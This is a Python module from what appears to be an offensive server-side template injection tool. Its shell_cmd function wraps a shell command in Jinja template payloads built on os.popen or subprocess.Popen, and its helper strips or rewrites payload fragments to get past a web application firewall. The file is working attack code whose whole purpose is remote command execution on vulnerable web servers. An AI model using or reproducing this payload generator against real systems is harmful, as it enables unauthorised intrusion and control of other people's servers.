from ssti import pattern
import logging

logger = logging.Logger("[SSTI ShellCmd]")

# should_set_abcd

def filter_before_dict(waf_func):
    for k, v in pattern.before_dict.copy().items():
        if not waf_func(v):
            if waf_func(v.replace("|count", "|length")):
                pattern.before_dict[k] = v.replace("|count", "|length")
            else:
                del pattern.before_dict[k]
    
    for k, v in pattern.number_dict.copy().items():
        if v not in pattern.before_dict:
            del pattern.number_dict[k]
    
    pattern.before = "".join(pattern.before_dict.values())


def shell_cmd(waf_func, cmd):

    filter_before_dict(waf_func)


    if waf_func("{{"):
        outer_pattern = "{{PAYLOAD}}"
    else:
        logging.warning("{{ is being waf, no execute result for you!")
        outer_pattern = "{% set x=PAYLOAD %}"

    types = [
        pattern.OSPopenPattern1,
        pattern.OSPopenPattern2,
        pattern.SubprocessPopenPattern1,
    ]
    for t in types:
        mod = t(cmd)
        ret = mod.test_requirements(waf_func)
        if ret:

            logger.info("Bypassing WAF Success!")

            payload = outer_pattern.replace("PAYLOAD", mod.payload)
            if pattern.should_set_abcd:
                payload = pattern.before + payload
            return payload
            
    logger.warning("Bypassing WAF Failed.")
    return None